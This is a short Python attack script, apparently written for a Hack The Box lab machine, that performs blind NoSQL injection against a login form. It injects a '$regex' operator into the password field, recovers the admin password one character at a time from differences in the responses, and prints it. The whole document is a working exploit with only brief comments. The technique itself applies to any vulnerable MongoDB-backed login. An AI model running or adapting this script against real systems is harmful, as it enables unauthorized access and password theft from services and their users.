#!/usr/bin/env python3

import requests
import string

url = "http://painters.htb/administration/login"
alphabet = string.ascii_letters + string.digits + "_{}!@#"
password = ""

print("[+] Starting Blind NoSQL exfiltration...")

while True:
    for char in alphabet:
        # We use $regex to check if the password starts with our current string + char
        payload = {
            "username": "admin", 
            "pass[$regex]": f"^{password}{char}"
        }
        r = requests.post(url, data=payload, verify=False, allow_redirects=False)
        
        # If the response is a 302 (redirect) or doesn't contain "Incorrect", we found a char
        if "Incorrect" not in r.text:
            password += char
            print(f"[!] Found character: {password}")
            break
    else:
        # If we loop through the whole alphabet and find nothing, we're done
        break

print(f"[+] Final Password: {password}")
